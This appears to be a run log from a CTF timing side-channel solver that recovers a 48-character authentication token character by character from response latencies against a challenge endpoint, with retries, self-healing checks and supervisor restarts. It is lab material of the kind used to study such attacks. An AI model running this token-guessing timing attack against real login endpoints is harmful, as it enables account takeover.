+  [HTTP 502] retrying in 1.5s, cadence -> 2.09s (1/12)...
+  [18/62] 'h': 109.18 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [19/62] 'i': 104.88 ms
+  [20/62] 'j': 98.89 ms
+  [21/62] 'k': 108.44 ms
+  [22/62] 'l': 101.46 ms
+  [23/62] 'm': 105.79 ms
+  [24/62] 'n': 555.75 ms
+  [25/62] 'o': 114.23 ms
+  [26/62] 'p': 107.43 ms
+  [27/62] 'q': 103.47 ms
+  [28/62] 'r': 113.27 ms
+  [29/62] 's': 153.45 ms
+  [30/62] 't': 126.00 ms
+  [31/62] 'u': 108.06 ms
+  [32/62] 'v': 118.20 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 0.55s (1/12)...
+  [33/62] 'w': 107.91 ms
+  [34/62] 'x': 103.92 ms
+  [35/62] 'y': 118.12 ms
+  [36/62] 'z': 108.85 ms
+  [37/62] 'A': 102.53 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 0.62s (1/12)...
+  [38/62] 'B': 101.58 ms
+  [39/62] 'C': 103.26 ms
+  [40/62] 'D': 125.59 ms
+  [41/62] 'E': 119.77 ms
+  [42/62] 'F': 113.77 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 0.67s (1/12)...
+  [43/62] 'G': 105.67 ms
+  [44/62] 'H': 110.94 ms
+  [45/62] 'I': 114.59 ms
+  [46/62] 'J': 109.65 ms
+  [47/62] 'K': 112.99 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 0.70s (1/12)...
+  [48/62] 'L': 113.04 ms
+  [49/62] 'M': 116.39 ms
+  [50/62] 'N': 114.13 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.05s (1/12)...
+  [51/62] 'O': 116.40 ms
+  [52/62] 'P': 103.30 ms
+  [53/62] 'Q': 107.81 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.57s (1/12)...
+  [54/62] 'R': 107.16 ms
+  [55/62] 'S': 113.67 ms
+  [56/62] 'T': 108.00 ms
+  [57/62] 'U': 110.36 ms
+  [58/62] 'V': 112.96 ms
+  [59/62] 'W': 107.08 ms
+  [60/62] 'X': 110.23 ms
+  [61/62] 'Y': 107.38 ms
+  [62/62] 'Z': 115.47 ms
+  [screening retry] 62 candidates in 103.2s; baseline: 109.94 ms; sigma: 6.21 ms; margin: 18.64 ms
+  => Retry Phase 1 winner 'n': 555.75 ms (threshold 128.58 ms)
+  [OK] Picked 'n' (555.75 ms) -> AoTewn  [216.8s/pos, ~152 min left]
+
+!!! SELF-HEALING CHECK: re-screening position 6 (expecting 'n') !!!
+  [ 1/62] '0': 101.05 ms
+  [ 2/62] '1': 115.79 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 0.57s (1/12)...
+  [ 3/62] '2': 96.19 ms
+  [ 4/62] '3': 102.98 ms
+  [ 5/62] '4': 103.92 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 0.86s (1/12)...
+  [ 6/62] '5': 103.89 ms
+  [ 7/62] '6': 114.19 ms
+  [ 8/62] '7': 108.79 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.29s (1/12)...
+  [ 9/62] '8': 107.34 ms
+  [10/62] '9': 108.85 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.93s (1/12)...
+  [11/62] 'a': 104.16 ms
+  [12/62] 'b': 98.41 ms
+  [13/62] 'c': 111.99 ms
+  [14/62] 'd': 112.09 ms
+  [15/62] 'e': 103.98 ms
+  [16/62] 'f': 113.46 ms
+  [17/62] 'g': 113.47 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.31s (1/12)...
+  [18/62] 'h': 120.36 ms
+  [19/62] 'i': 111.73 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.96s (1/12)...
+  [20/62] 'j': 313.21 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [21/62] 'k': 115.48 ms
+  [22/62] 'l': 102.40 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [23/62] 'm': 101.86 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [24/62] 'n': 107.85 ms
+  [25/62] 'o': 123.65 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [26/62] 'p': 109.95 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [27/62] 'q': 111.61 ms
+  [28/62] 'r': 107.60 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [29/62] 's': 103.75 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [HTTP 502] retrying in 3.0s, cadence -> 2.50s (2/12)...
+  [30/62] 't': 112.79 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [31/62] 'u': 103.87 ms
+  [32/62] 'v': 104.43 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [33/62] 'w': 122.69 ms
+  [34/62] 'x': 105.37 ms
+  [35/62] 'y': 115.06 ms
+  [36/62] 'z': 114.98 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [37/62] 'A': 114.18 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [38/62] 'B': 112.30 ms
+[*] Target Endpoint: https://619b19eb-70d8-4eaf-ae1c-57d1c8de2a76.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: 'AoTewn' (6/48)
+[*] Fresh sequential cadence: start 0.48s; State File: solver/state.json
+
+!!! SELF-HEALING CHECK: re-screening position 6 (expecting 'n') !!!
+  [HTTP 502] retrying in 0.8s, cadence -> 0.50s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 0.65s (2/12)...
+  self-heal: 10/62
+  [HTTP 502] retrying in 0.8s, cadence -> 0.84s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 0.87s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 0.91s (1/12)...
+  self-heal: 20/62
+  [HTTP 502] retrying in 0.8s, cadence -> 0.95s (1/12)...
+  self-heal: 30/62
+  [HTTP 502] retrying in 0.8s, cadence -> 0.79s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 1.02s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.33s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 1.50s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  self-heal: 40/62
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  self-heal: 50/62
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  self-heal: 60/62
+  [HTTP 502] retrying in 0.8s, cadence -> 1.25s (1/12)...
+  self-heal: 62/62
+
+!!! SELF-HEALING STOP: position 6 expected 'n' measured -0.22z relative to baseline 109.47 ms (sigma 4.45 ms) !!!
+[*] Target Endpoint: https://619b19eb-70d8-4eaf-ae1c-57d1c8de2a76.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: 'AoTew' (5/48)
+[*] Fresh sequential cadence: start 0.48s; State File: solver/state.json
+  [HTTP 502] retrying in 0.8s, cadence -> 0.50s (1/12)...
+  screening: 10/62
+  [HTTP 502] retrying in 0.8s, cadence -> 0.52s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 0.67s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 0.87s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 1.14s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.48s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  screening: 20/62
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  screening: 30/62
+  [HTTP 502] retrying in 0.8s, cadence -> 1.25s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  screening: 40/62
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  screening: 50/62
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  screening: 60/62
+  screening: 62/62
+  [artifact] excluded '0': phase-1 z=83.61; re-probe z=-1.20,-0.31
+  [artifact] excluded 'b': phase-1 z=8.15; re-probe z=-0.76,-0.47
+[OK] pos=6/48 char='H' z=29.80 delta=+229.33ms probes=67 wall=113.1s
+
+!!! SELF-HEALING CHECK: re-screening position 6 (expecting 'H') !!!
+  [HTTP 502] retrying in 0.8s, cadence -> 1.25s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  self-heal: 10/62
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 1.50s (2/12)...
+  self-heal: 20/62
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 1.50s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  self-heal: 30/62
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 1.50s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  self-heal: 40/62
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 1.50s (2/12)...
+  self-heal: 50/62
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 1.50s (1/12)...
+  self-heal: 60/62
+  self-heal: 62/62
+
+!!! SELF-HEALING STOP: position 6 expected 'H' measured -0.33z relative to baseline 104.03 ms (sigma 7.12 ms) !!!
+[*] Target Endpoint: https://619b19eb-70d8-4eaf-ae1c-57d1c8de2a76.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: 'AoTewH' (6/48)
+[*] Fresh sequential cadence: start 2.00s; State File: solver/state.json
+
+!!! SELF-HEALING CHECK: re-screening position 6 (expecting 'H') !!!
+  [HTTP 502] retrying in 0.8s, cadence -> 2.60s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 2.70s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 3.52s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 4.57s (2/12)...
+  [HTTP 502] storm mode: sleeping 8.0s (request 3/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 5.00s (1/12)...
+  self-heal: 10/62
+  [HTTP 502] retrying in 0.8s, cadence -> 5.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 5.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 5.00s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 5.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 5.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 5.00s (1/12)...
+  self-heal: 20/62
+  [HTTP 502] retrying in 0.8s, cadence -> 5.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 5.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 5.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 5.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 5.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 5.00s (2/12)...
+[*] Target Endpoint: https://619b19eb-70d8-4eaf-ae1c-57d1c8de2a76.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 3.00s; State File: solver/state.json
+  [HTTP 502] retrying in 0.8s, cadence -> 3.90s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 5.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 5.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 5.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 5.00s (1/12)...
+  screening: 10/62
+  [HTTP 502] retrying in 0.8s, cadence -> 5.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 5.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 5.00s (1/12)...
+  screening: 20/62
+  [HTTP 502] retrying in 0.8s, cadence -> 5.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 5.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 5.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 5.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 5.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 5.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 5.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 5.00s (2/12)...
+  screening: 30/62
+  [HTTP 502] retrying in 0.8s, cadence -> 5.00s (1/12)...
+  screening: 40/62
+[*] Target Endpoint: https://619b19eb-70d8-4eaf-ae1c-57d1c8de2a76.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 4.00s; State File: solver/state.json
+  [HTTP 502] retrying in 0.8s, cadence -> 5.20s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 6.76s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 8.79s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  screening: 10/62
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  screening: 20/62
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] storm mode: sleeping 8.0s (request 3/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  screening: 30/62
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  screening: 40/62
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] storm mode: sleeping 8.0s (request 3/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  screening: 50/62
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  screening: 60/62
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  screening: 62/62
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [artifact] excluded 'l': phase-1 z=104.80; re-probe z=1.13,1.89
+  [artifact] excluded 'R': phase-1 z=8.00; re-probe z=2.18,2.75
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [!] No relative winner: best=3.31z; re-running the full screen once...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  screening retry: 10/62
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  screening retry: 20/62
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+[*] Target Endpoint: https://619b19eb-70d8-4eaf-ae1c-57d1c8de2a76.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 4.00s; State File: solver/state.json
+  [HTTP 502] retrying in 0.8s, cadence -> 4.16s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 5.41s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 7.03s (1/12)...
+  screening: 10/62
+  [HTTP 502] retrying in 0.8s, cadence -> 7.31s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  screening: 20/62
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  screening: 30/62
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  screening: 40/62
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 1 2026-08-23 21:03:20] launching solver
+[*] Target Endpoint: https://619b19eb-70d8-4eaf-ae1c-57d1c8de2a76.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 4.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+  [HTTP 502] retrying in 0.8s, cadence -> 5.20s (1/12)...
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 1 2026-08-23 21:03:26] solver exited code=3
+[supervisor 2 2026-08-23 21:04:11] launching solver
+[*] Target Endpoint: https://619b19eb-70d8-4eaf-ae1c-57d1c8de2a76.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 4.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 2 2026-08-23 21:04:11] solver exited code=3
+[supervisor 3 2026-08-23 21:04:56] launching solver
+[*] Target Endpoint: https://619b19eb-70d8-4eaf-ae1c-57d1c8de2a76.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 4.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 3 2026-08-23 21:04:57] solver exited code=3
+[supervisor 4 2026-08-23 21:05:42] launching solver
+[*] Target Endpoint: https://619b19eb-70d8-4eaf-ae1c-57d1c8de2a76.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 4.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 4 2026-08-23 21:05:42] solver exited code=3
+[supervisor 5 2026-08-23 21:06:27] launching solver
+[*] Target Endpoint: https://619b19eb-70d8-4eaf-ae1c-57d1c8de2a76.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 4.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+  [HTTP 502] retrying in 0.8s, cadence -> 5.20s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 6.76s (2/12)...
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 5 2026-08-23 21:06:40] solver exited code=3
+[supervisor 1 2026-08-23 21:10:22] launching solver
+[*] Target Endpoint: https://c2b8d32e-0d17-4559-a42c-a4e26d72aa0b.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 4.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+  [HTTP 502] retrying in 0.8s, cadence -> 5.20s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 6.76s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 8.79s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  screening: 10/62
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] storm mode: sleeping 8.0s (request 3/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  screening: 20/62
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] storm mode: sleeping 8.0s (request 3/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  screening: 30/62
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  screening: 40/62
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  screening: 50/62
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] storm mode: sleeping 8.0s (request 3/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] storm mode: sleeping 8.0s (request 3/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  screening: 60/62
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  screening: 62/62
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] storm mode: sleeping 8.0s (request 3/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [artifact] excluded 'V': phase-1 z=99.01; re-probe z=-0.35,0.28
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
